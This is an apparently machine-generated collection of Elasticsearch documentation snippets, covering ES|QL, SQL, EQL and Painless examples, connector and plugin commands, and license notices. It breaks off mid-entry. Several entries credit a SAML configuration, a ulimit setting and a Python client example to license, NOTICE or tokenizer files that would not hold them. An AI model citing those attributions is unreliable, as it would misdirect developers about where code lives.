https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"service\": \"Knowledge\",\n    \"query\": \"author.nameSTARTSWITHSystem Administrator\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: OffsetTime Methods and Fields\nDESCRIPTION: Lists the methods and fields available in the java.time.OffsetTime class. It provides a summary of operations available on OffsetTime objects such as arithmetic operations, parsing, conversion to LocalTime, truncating, adjusting, and modifying specific time components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_11\n\nLANGUAGE: java\nCODE:\n```\n\"  OffsetTime minus(TemporalAmount)\n  OffsetTime minus(long,TemporalUnit)\n  OffsetTime minusHours(long)\n  OffsetTime minusMinutes(long)\n  OffsetTime minusSeconds(long)\n  OffsetTime minusNanos(long)\n  OffsetTime parse(CharSequence)\n  OffsetTime parse(CharSequence,DateTimeFormatter)\n  LocalTime toLocalTime()\n  OffsetTime truncatedTo(TemporalUnit)\n  OffsetTime with(TemporalAdjuster)\n  OffsetTime with(TemporalField,long)\n  OffsetTime withHour(int)\n  OffsetTime withMinute(int)\n  OffsetTime withNano(int)\n  OffsetTime withOffsetSameLocal(ZoneOffset)\n  OffsetTime withOffsetSameInstant(ZoneOffset)\n  OffsetTime withSecond(int)\"\n```\n\n----------------------------------------\n\nTITLE: Incompatible With Secondary Licenses Notice Template\nDESCRIPTION: Notice text indicating the source code is incompatible with secondary licenses under MPL 2.0\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-common/licenses/httpclient-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nThis Source Code Form is \"Incompatible With Secondary Licenses\", as\\ndefined by the Mozilla Public License, v. 2.0.\n```\n\n----------------------------------------\n\nTITLE: Example of E Function Usage\nDESCRIPTION: Shows how to use the E function to get Euler's number and demonstrates using it with other functions like CEIL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT E(), CEIL(E());\n\n       E()       |   CEIL(E())\n-----------------+---------------\n2.718281828459045|3\n```\n\n----------------------------------------\n\nTITLE: Retrieving Stored Synchronous EQL Search Results in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to retrieve the results of a previously stored synchronous EQL search using the get async EQL search API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_30\n\nLANGUAGE: console\nCODE:\n```\nGET /_eql/search/FjlmbndxNmJjU0RPdExBTGg0elNOOEEaQk9xSjJBQzBRMldZa1VVQ2pPa01YUToxMDY=\n```\n\n----------------------------------------\n\nTITLE: Equivalent Sequence Without Runs\nDESCRIPTION: Shows the expanded form of the previous query without using 'with runs'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_22\n\nLANGUAGE: eql\nCODE:\n```\nsequence\n  [ process where event.type == \"creation\" ]\n  [ library where process.name == \"regsvr32.exe\" ]\n  [ library where process.name == \"regsvr32.exe\" ]\n  [ library where process.name == \"regsvr32.exe\" ]\n  [ registry where true ]\n```\n\n----------------------------------------\n\nTITLE: Creating PostgreSQL Connector via Elasticsearch API\nDESCRIPTION: API endpoint for creating a new self-managed PostgreSQL connector in Elasticsearch with index name and service type configuration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-postgresql-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from PostgreSQL\",\n  \"service_type\": \"postgresql\"\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Store SMB Plugin for Elasticsearch\nDESCRIPTION: Command to install the Store SMB plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/store-smb.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install store-smb\n```\n\n----------------------------------------\n\nTITLE: Embedding SVG Image in Markdown for FROM_BASE64 Function Syntax\nDESCRIPTION: This snippet embeds an SVG image illustrating the syntax of the FROM_BASE64 function using Markdown image syntax with additional attributes for styling and accessibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/from_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/from_base64.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Multi-Value Mode Configuration\nDESCRIPTION: Configuration example for handling multi-valued fields in decay functions, showing how to specify the multi_value_mode parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n    \"DECAY_FUNCTION\": {\n        \"FIELD_NAME\": {\n              \"origin\": ...,\n              \"scale\": ...\n        },\n        \"multi_value_mode\": \"avg\"\n    }\n```\n\n----------------------------------------\n\nTITLE: Result of Configured Pattern Analyzer\nDESCRIPTION: Shows the result of applying the pattern analyzer configured to split based on non-word characters or underscore, and lowercasing. Demonstrates the output after splitting the email address.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n[ john, smith, foo, bar, com ]\n```\n\n----------------------------------------\n\nTITLE: Terms Generated by Whitespace Tokenizer Example\nDESCRIPTION: This example output illustrates the result of using the whitespace tokenizer on the provided text. The 'whitespace' tokenizer divides the text into tokens wherever it detects a whitespace character.\n\nThe expected output is a list of terms generated from the input text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-whitespace-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ The, 2, QUICK, Brown-Foxes, jumped, over, the, lazy, dog's, bone. ]\n```\n\n----------------------------------------\n\nTITLE: Multiplying Time Intervals in Elasticsearch SQL\nDESCRIPTION: Example demonstrating how to multiply a time interval by a scalar value using the * operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT -2 * INTERVAL '3' YEARS AS result;\n\n    result\n---------------\n-6-0\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Aggregation Profile Output\nDESCRIPTION: This snippet shows the aggregation profile output from an Elasticsearch search query. It includes detailed timing information for each aggregation, breakdown of execution times, and debug information for expert users.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"profile\": {\n    \"shards\": [\n      {\n        \"aggregations\": [\n          {\n            \"type\": \"NumericTermsAggregator\",\n            \"description\": \"my_scoped_agg\",\n            \"time_in_nanos\": 79294,\n            \"breakdown\": {\n              \"reduce\": 0,\n              \"build_aggregation\": 30885,\n              \"build_aggregation_count\": 1,\n              \"initialize\": 2623,\n              \"initialize_count\": 1,\n              \"reduce_count\": 0,\n              \"collect\": 45786,\n              \"collect_count\": 4,\n              \"build_leaf_collector\": 18211,\n              \"build_leaf_collector_count\": 1,\n              \"post_collection\": 929,\n              \"post_collection_count\": 1\n            },\n            \"debug\": {\n              \"total_buckets\": 1,\n              \"result_strategy\": \"long_terms\",\n              \"built_buckets\": 1\n            }\n          },\n          {\n            \"type\": \"GlobalAggregator\",\n            \"description\": \"my_global_agg\",\n            \"time_in_nanos\": 104325,\n            \"breakdown\": {\n              \"reduce\": 0,\n              \"build_aggregation\": 22470,\n              \"build_aggregation_count\": 1,\n              \"initialize\": 12454,\n              \"initialize_count\": 1,\n              \"reduce_count\": 0,\n              \"collect\": 69401,\n              \"collect_count\": 4,\n              \"build_leaf_collector\": 8150,\n              \"build_leaf_collector_count\": 1,\n              \"post_collection\": 1584,\n              \"post_collection_count\": 1\n            },\n            \"debug\": {\n              \"built_buckets\": 1\n            },\n            \"children\": [\n              {\n                \"type\": \"NumericTermsAggregator\",\n                \"description\": \"my_level_agg\",\n                \"time_in_nanos\": 76876,\n                \"breakdown\": {\n                  \"reduce\": 0,\n                  \"build_aggregation\": 13824,\n                  \"build_aggregation_count\": 1,\n                  \"initialize\": 1441,\n                  \"initialize_count\": 1,\n                  \"reduce_count\": 0,\n                  \"collect\": 61611,\n                  \"collect_count\": 4,\n                  \"build_leaf_collector\": 5564,\n                  \"build_leaf_collector_count\": 1,\n                  \"post_collection\": 471,\n                  \"post_collection_count\": 1\n                },\n                \"debug\": {\n                  \"total_buckets\": 1,\n                  \"result_strategy\": \"long_terms\",\n                  \"built_buckets\": 1\n                }\n              }\n            ]\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: IP Prefix Aggregation with Minimum Document Count\nDESCRIPTION: Demonstrates IP prefix aggregation that only returns buckets containing at least 3 documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-ipprefix-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /network-traffic/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ipv4-subnets\": {\n      \"ip_prefix\": {\n        \"field\": \"ipv4\",\n        \"prefix_length\": 24,\n        \"min_doc_count\": 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Docker Command for Serving GeoIP Database Files\nDESCRIPTION: Docker command to serve static GeoIP database files using nginx server with read-only volume mounting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_8\n\nLANGUAGE: sh\nCODE:\n```\ndocker run -v my/source/dir:/usr/share/nginx/html:ro nginx\n```\n\n----------------------------------------\n\nTITLE: Using SPACE Function in Elasticsearch SQL\nDESCRIPTION: Returns a character string consisting of a specified number of spaces. Returns null if the input is null or negative, with a limit of 1 MB for the resulting string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nSPACE(count) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SPACE(3);\n\n   SPACE(3)\n---------------\n\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP SAML Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for enabling SAML authentication in Elasticsearch. This configures Security Assertion Markup Language authentication and specifies the SAML realm to use.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: saml\nxpack.security.http.authentication.realm: saml1\n```\n\n----------------------------------------\n\nTITLE: Example NotEntitledException Error Message\nDESCRIPTION: Demonstrates the structure of a NotEntitledException, showing component, module, class, and missing entitlement details\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/README.md#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nNotEntitledException: component [(server)], module [org.apache.lucene.misc], class [class org.apache.lucene.misc.store.DirectIODirectory], entitlement [read_store_attributes]\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Mapping Table in Markdown\nDESCRIPTION: A markdown table showing the mapping of input numeric types (double, integer, long) to their result type (double) in ESQL functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n```\n\n----------------------------------------\n\nTITLE: Defining ZoneRulesException Class\nDESCRIPTION: Defines the structure of the ZoneRulesException class for handling time zone rule related exceptions. Takes a String parameter in its constructor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.zone.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.zone.ZoneRulesException {\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Hourly Event Count in ESQL\nDESCRIPTION: Creates hourly buckets for the last 24 hours and calculates event counts per hour.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_6\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE @timestamp >= NOW() - 1 day and @timestamp < NOW()\n| STATS COUNT(*) BY bucket = BUCKET(@timestamp, 25, NOW() - 1 day, NOW())\n```\n\n----------------------------------------\n\nTITLE: DISSECT with Type Conversion\nDESCRIPTION: ESQL query demonstrating DISSECT with type conversion of the parsed date field\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z - some text - 127.0.0.1\"\n| DISSECT a \"\"\"%{date} - %{msg} - %{ip}\"\"\"\n| KEEP date, msg, ip\n| EVAL date = TO_DATETIME(date)\n```\n\n----------------------------------------\n\nTITLE: Aggregating Without Grouping in ESQL\nDESCRIPTION: Shows how omitting the BY clause in STATS returns one row with aggregations applied over the entire dataset.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary = AVG(salary),\n  min_salary = MIN(salary),\n  max_salary = MAX(salary);\n```\n\n----------------------------------------\n\nTITLE: Cardinality Aggregation with Precision Control\nDESCRIPTION: Example showing how to control precision using precision_threshold parameter, which trades memory for accuracy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cardinality-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"type_count\": {\n      \"cardinality\": {\n        \"field\": \"type\",\n        \"precision_threshold\": 100\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Query with Aggregation Exceeding Maximum Limit\nDESCRIPTION: Demonstrates an ESQL query with aggregation that processes all documents but still respects the maximum row limit.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/common/result-set-size-limitation.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM index | STATS AVG(field1) BY field2 | LIMIT 20000\n```\n\n----------------------------------------\n\nTITLE: ESQL Data Type Mapping Table\nDESCRIPTION: Type compatibility table showing supported point/shape input types and their corresponding double result type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/st_ymin.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| point | result |\n| --- | --- |\n| cartesian_point | double |\n| cartesian_shape | double |\n| geo_point | double |\n| geo_shape | double |\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Memory and Ulimit Configuration for Tests\nDESCRIPTION: Configuration file snippet showing recommended ulimit settings for a test environment, which increases the open file limit for the Elasticsearch user.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nelasticsearch - nofile 64000\n```\n\n----------------------------------------\n\nTITLE: Equivalent Synonyms without Explicit Mapping\nDESCRIPTION: Defines synonym groups where token replacement behavior depends on the expand parameter in token filter configuration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/src/test/cluster/config/analysis/synonym.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nipod, i-pod, i pod\nfoozball , foosball\nuniverse , cosmos\nlol, laughing out loud\n```\n\n----------------------------------------\n\nTITLE: GeoIP Database Bundle Structure Example\nDESCRIPTION: Example directory structure for a GeoIP database bundle showing the placement of custom mmdb file in the ingest-geoip folder.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n$ tree .\n.\n└── ingest-geoip\n    └── MyGeoLite2-City.mmdb\n```\n\n----------------------------------------\n\nTITLE: Filtering Functions with Single Character Wildcard in Elasticsearch SQL\nDESCRIPTION: Example of using SHOW FUNCTIONS with LIKE clause using underscore (_) wildcard to match exactly one character.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-functions.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSHOW FUNCTIONS LIKE 'A__';\n\n     name      |     type\n---------------+---------------\nAVG            |AGGREGATE\nABS            |SCALAR\n```\n\n----------------------------------------\n\nTITLE: Filtering Recent Logs Using NOW() in ESQL\nDESCRIPTION: Demonstrates how to query logs from the last hour by using NOW() function with time arithmetic in a WHERE clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/now.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE @timestamp > NOW() - 1 hour\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_DATE Function in Elasticsearch SQL\nDESCRIPTION: Example demonstrating the CURRENT_DATE() function which returns the current date when the query was executed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_DATE() AS result;\n\n         result\n------------------------\n2018-12-12\n```\n\n----------------------------------------\n\nTITLE: Extracting DateTime Components\nDESCRIPTION: Demonstrates extracting individual components from a ZonedDateTime object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 100, ZoneId.of(tz));\nint year = zdt.getYear();\nint month = zdt.getMonthValue();\nint day = zdt.getDayOfMonth();\nint hour = zdt.getHour();\nint minutes = zdt.getMinute();\nint seconds = zdt.getSecond();\nint nanos = zdt.getNano();\n```\n\n----------------------------------------\n\nTITLE: Painless Definition File Comment\nDESCRIPTION: Documentation comment explaining the purpose of Painless definition files, which define class hierarchies, methods, and fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n#\n# Painless definition file. This defines the hierarchy of classes,\n# what methods and fields they have, etc.\n#\n```\n\n----------------------------------------\n\nTITLE: Thread Creation Restrictions\nDESCRIPTION: Forbidden anonymous thread constructors. Threads should always be created with explicit names for better debugging.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_9\n\nLANGUAGE: java\nCODE:\n```\njava.lang.Thread#<init>(java.lang.Runnable)\njava.lang.Thread#<init>(java.lang.ThreadGroup, java.lang.Runnable)\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Flattened Fields\nDESCRIPTION: Example of a Painless script accessing values from flattened field sub-fields using dot notation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\n\"script\": {\n  \"source\": \"\"\"\n    if (doc['labels.release'].value.equals('v1.3.0'))\n    {emit(doc['labels.release'].value)}\n    else{emit('Version mismatch')}\n  \"\"\"\n```\n\n----------------------------------------\n\nTITLE: ESQL MAX Function Comment Header\nDESCRIPTION: Generated comment header for ESQL MAX function test template, indicating it is auto-generated and should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/max.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Croneval Command Syntax\nDESCRIPTION: Shows the basic command syntax for elasticsearch-croneval including all available command line options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-croneval.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-croneval <expression>\n[-c, --count <integer>] [-h, --help]\n([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Input Document for Nested Path Expansion\nDESCRIPTION: Shows an example document with dotted fields nested within a non-dotted structure before processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_11\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\" : {\n    \"bar.one\" : \"value\",\n    \"bar.two\" : \"value\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing the mapper-annotated-text plugin from Elasticsearch\nDESCRIPTION: Command to remove the mapper-annotated-text plugin from Elasticsearch. The node must be stopped before executing this removal command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove mapper-annotated-text\n```\n\n----------------------------------------\n\nTITLE: Working with Single-Dimensional Arrays in Painless\nDESCRIPTION: Illustrates various operations with single-dimensional arrays in Painless, including declaration, initialization, and element access.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\nint[] x;                   \nfloat[] y = new float[10]; \ndef z = new float[5];      \ny[9] = 1.0F;               \nz[0] = y[9];               \n```\n\n----------------------------------------\n\nTITLE: Querying Documents by Routing Value in Elasticsearch\nDESCRIPTION: Example of using the _routing field in a terms query to find documents with a specific routing value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-routing-field.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"terms\": {\n      \"_routing\": [ \"user1\" ] <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Spotless Java Formatting with Gradle\nDESCRIPTION: Gradle command to automatically reformat all Java files in the project according to Elasticsearch's formatting standards using the Spotless plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew spotlessApply\n```\n\n----------------------------------------\n\nTITLE: Tail Pipe Syntax in EQL\nDESCRIPTION: Defines the syntax for the 'tail' pipe in EQL. The <max> parameter specifies the maximum number of matching events or sequences to return.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-pipe-ref.md#2025-04-21_snippet_3\n\nLANGUAGE: txt\nCODE:\n```\ntail <max>\n```\n\n----------------------------------------\n\nTITLE: MPL 2.0 Secondary License Incompatibility Notice\nDESCRIPTION: Notice text indicating that the source code is incompatible with secondary licenses under MPL 2.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/rest/licenses/httpclient-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nThis Source Code Form is \"Incompatible With Secondary Licenses\", as\\ndefined by the Mozilla Public License, v. 2.0.\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Index in Python\nDESCRIPTION: Performs a search query on an Elasticsearch index using the Python client.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/src/main/resources/org/elasticsearch/xpack/ml/inference.nlp.tokenizers/spm_precompiled_normalizer.txt#2025-04-21_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\nfrom elasticsearch import Elasticsearch\n\nes = Elasticsearch([{'host': 'localhost', 'port': 9200}])\n\nresult = es.search(index=\"my-index\", body={\n    \"query\": {\n        \"match\": {\n            \"title\": \"elasticsearch\"\n        }\n    }\n})\n\nfor hit in result['hits']['hits']:\n    print(hit['_source'])\n```\n\n----------------------------------------\n\nTITLE: Expand Parameter Synonym Behavior Demonstration\nDESCRIPTION: Illustrates how the expand parameter affects synonym token expansion and replacement strategies\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/src/test/cluster/config/analysis/synonym.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n# If expand==true\nipod, i-pod, i pod => ipod, i-pod, i pod\n\n# If expand==false\nipod, i-pod, i pod => ipod\n```\n\n----------------------------------------\n\nTITLE: Installing Elasticsearch Plugin from Custom URL\nDESCRIPTION: This command installs an Elasticsearch plugin from a specified URL. The plugin name is determined from its descriptor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/plugin-management-custom-url.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install [url]\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer to be signed by an employer or institution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/jakarta.mail-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: GeoPoint Field Script Factory Declaration\nDESCRIPTION: Declares the GeoPointFieldScript Factory class as whitelisted for painless scripting with no import required.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.geo_point_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nclass org.elasticsearch.script.GeoPointFieldScript$Factory @no_import {}\n```\n\n----------------------------------------\n\nTITLE: Result of synthetic source for long field type\nDESCRIPTION: Shows the result of synthetic source processing where the array of long values is sorted in ascending order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/number.md#2025-04-22_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"long\": [-123466, 0, 0, 87612]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Regex Circuit Breaker Settings\nDESCRIPTION: Settings to control and limit regex usage in Painless scripts. Includes regex enablement options and complexity limit factor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nscript.painless.regex.enabled: \"limited\"\nscript.painless.regex.limit-factor: 6\n```\n\n----------------------------------------\n\nTITLE: Using AVG Function in Elasticsearch SQL\nDESCRIPTION: The AVG function calculates the arithmetic mean of input values in a numeric field, ignoring null values. Returns a double numeric value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nAVG(numeric_field) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT AVG(salary) AS avg FROM emp;\n\n      avg\n---------------\n48248.55\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT AVG(salary / 12.0) AS avg FROM emp;\n\n      avg\n---------------\n4020.7125\n```\n\n----------------------------------------\n\nTITLE: Setting JVM Options for Elasticsearch Shard Tool\nDESCRIPTION: Example showing how to increase the heap size for the elasticsearch-shard tool by setting the CLI_JAVA_OPTS environment variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/shard-tool.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nexport CLI_JAVA_OPTS=\"-Xmx1g\"\nbin/elasticsearch-shard ...\n```\n\n----------------------------------------\n\nTITLE: Enforcing Reproducible Collection Shuffling\nDESCRIPTION: Requires using Collections.shuffle with an explicit random source for reproducible randomization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_17\n\nLANGUAGE: plaintext\nCODE:\n```\njava.util.Collections#shuffle(java.util.List) @ Use java.util.Collections#shuffle(java.util.List, java.util.Random) with a reproducible source of randomness\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice\nDESCRIPTION: Example notice to be displayed when an interactive program starts\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/licenses/openjdk-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: 